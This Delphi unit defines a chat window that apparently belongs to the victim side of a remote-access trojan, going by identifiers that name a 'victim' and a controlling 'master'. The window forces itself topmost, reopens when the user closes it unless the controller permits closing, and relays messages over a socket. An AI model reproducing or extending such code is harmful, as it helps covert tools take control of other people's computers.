unit Unit5;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls, ComCtrls;

type
  TMyChat = class(TForm)
    Timer: TTimer;
    Bevel1: TBevel;
    Edit1: TEdit;
    Button1: TButton;
    Timer2: TTimer;
    MyMemo: TRichEdit;
    procedure TimerTimer(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure FormResize(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Timer2Timer(Sender: TObject);
    procedure MyMemoChange(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    procedure ScrieVictimaInMemo(Ce: String);
    { Private declarations }
  public
    procedure ScrieClientuInMemo(Ce: String);
    procedure MakeItOnTop;
    { Public declarations }
  end;

var
  MyChat: TMyChat;
  FromMaster:Boolean;
  ListIndex:LongInt;
implementation

uses Unit1;

{$R *.DFM}

procedure TMyChat.TimerTimer(Sender: TObject);
begin
 MyChat.Paint;
end;

procedure TMyChat.MakeItOnTop;
begin
 SetWindowPos(MyChat.Handle,
          HWND_TOPMOST,
          0, 0, 0, 0,
          SWP_NOMOVE OR
          SWP_NOACTIVATE OR
          SWP_NOSIZE);
end;

procedure TMyChat.FormPaint(Sender: TObject);
begin
 SetZOrder(True);
end;

procedure TMyChat.FormClose(Sender: TObject; var Action: TCloseAction);
begin
if not Form1.PoateInchide then
 begin
  Timer.Enabled:=False;
  Timer2.Interval:=10;
  Timer2.Enabled:=True;
 end else begin
  timer.enabled:=false;
  timer2.enabled:=false;
  hide;
 end;
end;

procedure TMyChat.ScrieVictimaInMemo(Ce:String);
begin
 with MyMemo.SelAttributes do
  begin
   Color:=StringToColor(Form1.VCol);
   Size:=Form1.VSize;
  end;
  MyMemo.Lines.Add(Ce); 
end;

procedure TMyChat.ScrieClientuInMemo(Ce:String);
begin
 with MyMemo.SelAttributes do
  begin
   Color:=StringToColor(Form1.CCol);
   Size:=Form1.CSize;
  end;
  MyMemo.Lines.Add(Ce);
end;

procedure TMyChat.Button1Click(Sender: TObject);
var i:integer;
begin
 if Edit1.Text<>'' then
 begin
  for i:=0 to Form1.ChatSock.Socket.ActiveConnections do
   try Form1.ChatSock.Socket.Connections[i].SendText('MFV<server>'+MyChat.Edit1.Text);except end;
  ScrieVictimaInMemo('<server>'+MyChat.Edit1.Text);
  MyChat.Edit1.Text:='';
 end;
end;

procedure TMyChat.FormActivate(Sender: TObject);
begin
 Form1.PoateInchide:=False;
 Timer.Interval:=100;
 Timer.Enabled:=True;
end;

procedure TMyChat.FormResize(Sender: TObject);
begin
 Left:=round((Screen.Width-Width) div 2);
 Top:=round((Screen.Height-Height) div 2);
end;

procedure TMyChat.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
 if (Key = #13) then
  begin
   Key := #0;
   Button1Click(sender);
  end;
end;

procedure TMyChat.Timer2Timer(Sender: TObject);
begin
 MyChat.Show;
 Timer2.Enabled:=False;
end;

procedure TMyChat.MyMemoChange(Sender: TObject);
begin
 SendMessage(MyMemo.handle, EM_SCROLLCARET,0,0);
end;

procedure TMyChat.FormCreate(Sender: TObject);
begin
 RANDOMIZE;Caption:=IntToStr(RANDOM(777777777)*5+RANDOM(9999)+RANDOM(99999999));
end;

end.
